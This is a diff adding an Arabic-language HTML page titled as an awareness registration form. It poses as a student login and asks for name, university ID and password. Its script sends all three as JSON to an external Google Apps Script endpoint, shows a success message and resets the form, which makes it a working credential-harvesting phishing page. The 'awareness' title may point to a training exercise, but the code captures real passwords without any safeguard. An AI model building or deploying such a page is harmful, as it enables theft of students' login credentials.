@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>نموذج التسجيل - توعوي</title>
+</head>
+<body>
+    <h2>نموذج تسجيل الدخول للطلاب</h2>
+    <form id="registrationForm">
+        <label for="name">الاسم:</label><br>
+        <input type="text" id="name" name="name" required><br><br>
+
+        <label for="id">الرقم الجامعي:</label><br>
+        <input type="text" id="id" name="id" required><br><br>
+
+        <label for="password">كلمة المرور:</label><br>
+        <input type="password" id="password" name="password" required><br><br>
+
+        <button type="button" onclick="submitForm()">تأكيد</button>
+    </form>
+
+    <p id="msg" style="display:none; color: green;">✅ تم إرسال البيانات بنجاح!</p>
+
+    <script>
+        function submitForm() {
+            const data = {
+                name: document.getElementById("name").value,
+                id: document.getElementById("id").value,
+                password: document.getElementById("password").value
+            };
+
+            fetch("https://script.google.com/macros/s/AKfycbxXfVqy-zTYHZF2Qnetjw9lSHT6yTzGfHGH9-kYM02W1NvN3Ch8X_7z1JlyO5iBpqXvCw/exec", {
+                method: "POST",
+                body: JSON.stringify(data),
+                headers: {
+                    "Content-Type": "application/json"
+                }
+            })
+            .then(response => response.text())
+            .then(result => {
+                document.getElementById("msg").style.display = "block";
+                document.getElementById("registrationForm").reset();
+            })
+            .catch(error => {
+                alert("❌ حدث خطأ أثناء الإرسال: " + error);
+                console.error("Error:", error);
+            });
+        }
+    </script>
+</body>
+</html>
